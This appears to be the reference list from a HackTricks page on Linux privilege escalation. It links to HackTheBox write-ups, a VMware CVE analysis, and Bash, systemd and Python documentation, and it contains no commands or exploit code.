- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
